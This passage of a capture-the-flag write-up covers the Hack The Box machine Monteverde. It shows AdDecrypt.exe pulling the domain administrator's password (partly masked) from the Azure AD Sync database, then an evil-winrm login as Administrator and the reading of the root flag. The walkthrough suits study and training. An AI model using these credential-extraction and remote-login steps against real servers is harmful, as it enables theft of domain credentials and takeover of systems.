Opening database connection...
Error reading from database: A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 52 - Unable to locate a Local Database Runtime installation. Verify that SQL Server Express is properly installed and that the Local Database Runtime feature is enabled.)
Closing database connection...
```

Thanks to this link

https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/

...we try option `-FullSql`

```powershell
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\bin> c:\users\mhope\documents\AdDecrypt.exe -FullSql

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@iXXXXXXX
Domain: MEGABANK.LOCAL
```

## root flag

```powershell
joshua@kaligra:~/Documents/htb/machines/monteverde$ evil-winrm -i 10.10.10.172 -u  Administrator
Enter Password:

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
cd *Evil-WinRM* PS C:\Users\Administrator>      cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         5/1/2024   9:59 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> gc root.txt
6f62353d319XXXXXXXXXXXXXXXXX
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```





